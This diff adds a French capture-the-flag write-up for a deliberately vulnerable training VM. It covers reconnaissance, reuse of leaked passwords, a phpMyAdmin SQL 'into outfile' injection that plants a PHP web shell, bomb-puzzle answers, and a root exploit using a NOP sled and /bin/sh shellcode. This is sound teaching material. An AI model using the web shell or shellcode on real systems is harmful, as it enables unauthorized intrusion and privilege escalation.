@@ -1,0 +1,82 @@
+# Writeup1
+
+On lance la VM
+Puis un `ifconfig` pour voir si des ports sont occupés
+Vmnet8 a l'air sympa du coup on fait un `nmap` dessus (cela permet de scanner chaque adresse IP de x à y)
+La seconde IP a de multiple services ouverts : `ssh`, `http`, `https`
+On test le cette adresse IP sur le navigateur en `http` ... pas grand chose d'intéréssants.
+On lance le programme dirb qui prends deux arguments
+    => l'adresse IP a testé
+    => un fichier rempli d'extensions type : `/forum`, `/phpmyadmin`, `index.php` ...
+    Cela permet de voir sur quelle pages nous pouvons naviguer sur notre site.
+
+
+Dans notre cas, nous avons : `/forum`, `/phpmyadmin`, `/webmail`
+Dans forum `lmezard` poste un topic : `Probleme login ?`
+On fait un `grep` dessus avec le mot-clé `password` et on voit un "invalid user" du nom de `!q\]Ej?*5K5cy*AJ`
+On se connecte avec login : `lmezard` et password : `!q\]Ej?*5K5cy*AJ`
+Puis sur son compte, nous avons accès à son mail `laurie@borntosec.net`
+L'erreur de Laurie aura été de garder le même mot de passe sur le forum et sur sa boite mail ...
+Nous nous connectons ainsi sur `/webmail` avec pour login `laurie@borntosec.net` et password : `!q\]Ej?*5K5cy*AJ`
+Comme par hasard un mail `DB Access` nous fournit le login `root` et le password `Fg-'kKXBj87E:aJ$` afin de se connecter tranquillement à PhpMyAdmin, c'est propre !
+
+
+Injection SQL : ```select "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/inject.php";```
+Le path nous a été donné avec `dirb` et c'est le seul endroit où l'on avait le droit d'écriture
+Cela permet de faire des commandes shell sur le site commme cela par exemple : `/forum/templates_c/inject.php?cmd=ls%20/home`
+Dans le dossier `LOOKATME` se trouve un fichier `password` (`/forum/templates_c/inject.php?cmd=cat%20/home/LOOKATME/password`) contenant : `lmezard:G!@M6f4Eatau{sF"`
+
+
+Nous nous connectons sur la VM avec ces infos.
+Un fichier fun est présent, on le copie sur notre Mac et on commence à le lire
+Un main est présent :
+```
+int main() { printf("M"); printf("Y"); printf(" "); printf("P"); printf("A"); printf("S"); printf("S"); printf("W"); printf("O"); printf("R"); printf("D"); printf(" "); printf("I"); printf("S"); printf(":"); printf(" "); printf("%c",getme1()); printf("%c",getme2()); printf("%c",getme3()); printf("%c",getme4()); printf("%c",getme5()); printf("%c",getme6()); printf("%c",getme7()); printf("%c",getme8()); printf("%c",getme9()); printf("%c",getme10()); printf("%c",getme11()); printf("%c",getme12()); printf("\n"); printf("Now SHA-256 it and submit"); }
+```
+
+Nous allons donc voirr les fonctions `getme()`, certaines sont en clairs directement : `getme8 = w, getme9 = n, getme10 = a, getme11 = g, getme12 = e` puis d'autres sont à chercher. Il y a un numéro de file correspondant au `getme()`, il faut faire une recherche sur le numéro suivant et nous trouvons enfin le reste des `getme()` : `getme1 = I, getme2 = h, getme3 = e, getme4 = a, getme5= r, getme6 = t, getme7 = p`
+Ce qui donne `Iheartpwnage` que l'on hache en `sha256`
+
+
+On peut enfin se connecter avec login : `laurie` et password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+Il faut maintenant désamorcé une bombe, nous avons des indices et un executables.
+### 1er étape
+`strings bomb | grep P` 
+ou 
+On fait un `objdump -d bomb` pour voir comment sont appelés les fonctions puis on repère le `main` avec des fonctions `phase_x`
+On lance `gdb bomb`
+<!-- On set un breakpoint : `break phase_1` puis on `run`
+On recherche l'adresse mémoire : `p/x $eax` -->
+=> `Public speaking is very easy.`
+### 2e étape
+
+=> `1 2 6 24 120 720`
+### 3e étape
+
+=> `1 b 214`
+### 4e étape
+
+=> `9`
+### 5e étape
+
+=> `opekmq`
+### 6e étape
+
+=> `4 2 6 3 1 5`
+
+On se connecte en ssh avec le login : `thor` et password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Un fichier `turtle` contenant des mouvements à faire, est présent.
+On regarde sur internet `turlte python` => https://docs.python.org/2/library/turtle.html
+On a fait un script `turtle.py` qui va import la lib `turlte` et faire les mouvements up, down, left, right
+Le tracé se fait tout seul et il est affiché `slash`, on le hache en `md5`
+
+On se connecte en ssh avec login : `zaz` et password : `646da671ca01bb5d84dbb5fb2238dc8e`
+Un executable `exploit_me` est présent à la racine. Il faut faire du `buffer_overflow` pour cette partie
+Du coup on fait un `export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'`
+Ce qui correspond à l'ouverture d'un shell en `shellcode`
+Un programme en C nous indique ou se trouve le shellcode en mémoire
+./exploit_me `python -c 'print "\x90" * 140 + "SHELLCODE"'`
+On ecrit `\x90` sur 140 octets (ce qui corresponds a un NOP, cela passe a l'octet suivant) puis le shellcode.
+Le programme va lire le shellcode et ouvrir un nouveau shell en root car l'user qui a crée `./exploit_me` est `root`.
+
+# Yes we dit it !
